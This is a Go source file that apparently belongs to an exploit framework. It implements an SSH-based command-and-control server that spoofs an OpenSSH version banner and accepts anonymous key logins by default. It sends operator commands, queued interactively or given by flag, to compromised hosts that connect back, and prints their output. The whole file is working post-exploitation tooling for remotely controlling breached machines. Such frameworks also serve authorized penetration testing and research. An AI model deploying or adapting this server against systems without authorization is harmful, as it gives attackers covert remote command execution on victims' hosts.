package c2ssh

import (
	"bufio"
	"bytes"
	"crypto/ed25519"
	"crypto/rand"
	"crypto/x509"
	"encoding/hex"
	"encoding/pem"
	"errors"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"slices"
	"strings"
	"time"

	"github.com/vulncheck-oss/go-exploit/c2"
	"github.com/vulncheck-oss/go-exploit/c2/channel"
	"github.com/vulncheck-oss/go-exploit/c2/external"
	"github.com/vulncheck-oss/go-exploit/output"
	"golang.org/x/crypto/ssh"
)

var (
	flagCommand        string
	flagInteractive    bool
	flagHeartbeat      bool
	flagServerMessages bool
	commandQueue       []string
)

var Name = "SSHShellServer"

type SSHC2Meta struct {
	auth        *Auth
	SSHConfig   *ssh.ServerConfig
	Channel     *channel.Channel
	Listener    *net.Listener
	trustedKeys []ssh.PublicKey
}

var SSHServer c2.Impl

func New() SSHC2Meta {
	return SSHC2Meta{}
}

func generateEd25519Key() (sshPriv ssh.Signer, err error) {
	_, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		return sshPriv, err
	}

	bytes, err := x509.MarshalPKCS8PrivateKey(priv)
	if err != nil {
		return sshPriv, err
	}

	privatePem := pem.EncodeToMemory(
		&pem.Block{
			Type:  "PRIVATE KEY",
			Bytes: bytes,
		},
	)

	sshPriv, err = ssh.ParsePrivateKey(privatePem)
	if err != nil {
		return sshPriv, err
	}

	return sshPriv, nil
}

func (c2 *SSHC2Meta) SSHServerFlags() {
	// flag.StringVar(& , "host-key", "", "Host key to use for the SSH server")
	// flag.BoolVar(& , "save-host-key", false, "Save the generated host key")
	// flag.BoolVar(& , "generate-host-key", true, "Generate the SSH host key")
	// flag.StringVar(& , "authorized-keys", "", "Comma separated authorized keys that the server will accept, if this is not set the server will allow any connection")
	// flag.BoolVar(& , "close-channels", true, "Close any open channels when the C2 exits. Setting this to false leaves active exploit sessions open")
	flag.StringVar(&flagCommand, Name+".command", "", "Run a single command and exit the payload.")
	flag.BoolVar(&flagHeartbeat, Name+".heartbeat", false, "Print heartbeat checkins from the c2")
	flag.BoolVar(&flagServerMessages, Name+".server-messages", false, "Print server messages to the client")
	flag.BoolVar(&flagInteractive, Name+".interactive", true, "Run the commands in an interactive shell.")
}

func (c2 *SSHC2Meta) SSHServerInit() {
	c2.auth = NewAuth()
	c2.auth.AllowAnonymous(true)
	c2.SSHConfig = &ssh.ServerConfig{
		ServerVersion: "SSH-2.0-OpenSSH_9.7",
		PublicKeyCallback: func(conn ssh.ConnMetadata, key ssh.PublicKey) (*ssh.Permissions, error) {
			if !c2.auth.Anonymous() {
				if len(c2.auth.trusted) > 0 {
					ok, _ := c2.auth.Check(conn.RemoteAddr(), key)
					if !ok {
						output.PrintfFrameworkError("Key not authorized")
						return nil, errors.New("unauthorized key")
					}
				} else {
					output.PrintfFrameworkError("No authorized keys set")
					return nil, errors.New("no authorized keys added")
				}
			}
			perm := &ssh.Permissions{Extensions: map[string]string{
				"pubkey": string(key.Marshal()),
			}}
			return perm, nil
		},
	}
	priv, err := generateEd25519Key()
	if err != nil {
		panic("Could not generate SSH key")
	}
	c2.SSHConfig.AddHostKey(priv)
}

func (c2 *SSHC2Meta) SSHServerChannel(channel *channel.Channel) {
	c2.Channel = channel
}

func (c2 *SSHC2Meta) SSHServerRun(timeout int) bool {
	if flagCommand == "" && !flagInteractive {
		output.PrintFrameworkError("-command not set and -interactive is false. At least one must be set")
		return false
	}
	success := false
	output.PrintfFrameworkDebug("External SSH Listener starting: %s:%d", c2.Channel.IPAddr, c2.Channel.Port)

	l, err := net.Listen("tcp", fmt.Sprintf("%s:%d", c2.Channel.IPAddr, c2.Channel.Port))
	if err != nil {
		panic(err)
	}
	c2.Listener = &l
	// defer l.Close()
	isClosed := make(chan bool)
	go func() {
		if timeout != 0 {
			time.Sleep(time.Duration(timeout) * time.Second)
			if !success || !flagInteractive {
				if success {
					output.PrintFrameworkStatus("Timeout met. Shutting down SSH listener.")
				} else {
					output.PrintFrameworkError("Timeout met. Shutting down SSH listener.")
				}

				isClosed <- true
				(*c2.Listener).Close()
			}

		}
	}()

	for {

		// Once a ServerConfig has been configured, connections can be accepted.
		conn, err := (*c2.Listener).Accept()
		if err != nil {
			// I hate this, but
			if strings.Contains(err.Error(), "use of closed network connection") {
				return success
			}
			output.PrintfFrameworkError("SSH: Error accepting incoming connection: %v", err)
			continue
		}

		// Before use, a handshake must be performed on the incoming net.Conn.
		// It must be handled in a separate goroutine,
		// otherwise one user could easily block entire loop.
		// For example, user could be asked to trust server key fingerprint and hangs.
		go func() {
			output.PrintfFrameworkDebug("SSH: Handshaking for %s", conn.RemoteAddr())
			sConn, chans, reqs, err := ssh.NewServerConn(conn, c2.SSHConfig)
			if err != nil {
				if err == io.EOF {
					output.PrintfFrameworkDebug("SSH: Handshaking was terminated")
				} else {
					output.PrintfFrameworkDebug("SSH: Error on handshaking %s: %v", conn.RemoteAddr(), err)
				}
				return
			}
			output.PrintfFrameworkSuccess("Active shell SSH: Connection accepted from %s@%s session: %s (%s)", sConn.User(), sConn.RemoteAddr(), hex.EncodeToString(sConn.SessionID()), sConn.ClientVersion())
			success = true
			if flagInteractive {
				output.PrintFrameworkStatus("Interactive session started")
				go func() {
					for {

						reader := bufio.NewReader(os.Stdin)
						command, _ := reader.ReadString('\n')
						if command == "exit\n" {
							isClosed <- true
							(*c2.Listener).Close()
							return
						}
						output.PrintfFrameworkStatus("Running command on SSH client: '%s'", strings.ReplaceAll(command, "\n", ""))
						commandQueue = append(commandQueue, command)
					}
				}()
			}
			go ssh.DiscardRequests(reqs)
			go handleServerConn(sConn.Permissions.Extensions["key-id"], sConn.Permissions.Extensions["pubkey"], chans, commandHandler)
			go func(isClosed <-chan bool) {
				if <-isClosed {
					sConn.Close()
				}
			}(isClosed)
		}()

	}
}

func commandHandler(b []byte, k ssh.PublicKey) ([]byte, error) {
	switch string(b) {
	case "":
		if flagHeartbeat {
			output.PrintfFrameworkDebug("heartbeat")
		}
		if flagCommand != "" {
			c := flagCommand
			flagCommand = "exit"
			return []byte(c), nil
		}
		if flagInteractive {
			if len(commandQueue) > 0 {
				c := commandQueue[0]
				commandQueue = slices.Delete(commandQueue, 0, 1)
				return []byte(c), nil
			}
		}
	default:
		output.PrintfFrameworkSuccess("%s", string(b))
	}
	return []byte{}, nil
}

func handleServerConn(keyID string, pk string, chans <-chan ssh.NewChannel, function func([]byte, ssh.PublicKey) ([]byte, error)) error {
	var chanError error
	for newChan := range chans {
		if newChan.ChannelType() != "session" {
			newChan.Reject(ssh.UnknownChannelType, "unknown channel type")
			continue
		}

		ch, reqs, err := newChan.Accept()
		if err != nil {
			return err
		}

		go func(in <-chan *ssh.Request) error {
			defer ch.Close()

			for req := range in {
				switch req.Type {
				case "exec", "pty-req":
					n, _ := ssh.ParsePublicKey([]byte(pk))
					// I really hate this
					resp, err := function(req.Payload[4:], n)
					if err != nil {
						chanError = err
					}
					req.Reply(true, nil)
					io.Copy(ch, bytes.NewReader(resp))
					ch.SendRequest("exit-status", false, []byte{0, 0, 0, 0})
					return chanError
				case "env":
				case "x11-req", "auth-agent-req@openssh.com", "subsystem", "shell":
					// TODO add way to support other request types
					output.PrintfFrameworkDebug("SSH: Request type not supported: %#v", req.Type)
					if flagServerMessages {
						req.Reply(false, []byte("Request type not supported"))
						io.Copy(ch, bytes.NewReader([]byte("Request type not supported\r\n")))
					}
					ch.SendRequest("exit-status", false, []byte{0, 0, 0, 0})
					return chanError
				default:
					chanError = fmt.Errorf("SSH: Request type not valid: %#v", req.Type)
					output.PrintfFrameworkDebug("SSH: Request type not valid: %#v", req.Type)
					if flagServerMessages {
						req.Reply(false, []byte("Request type not valid"))
						io.Copy(ch, bytes.NewReader([]byte("Request type not valid\r\n")))
					}
					ch.SendRequest("exit-status", false, []byte{0, 0, 0, 0})
					return chanError
				}
			}
			return nil
		}(reqs)
	}
	if chanError != nil {
		return chanError
	}
	return nil
}

func Configure(externalServer *external.Server) {
	SSHServer = c2.AddC2(Name)
	sshc2 := New()
	externalServer.SetFlags(sshc2.SSHServerFlags)
	externalServer.SetChannel(sshc2.SSHServerChannel)
	externalServer.SetInit(sshc2.SSHServerInit)
	externalServer.SetRun(sshc2.SSHServerRun)
}
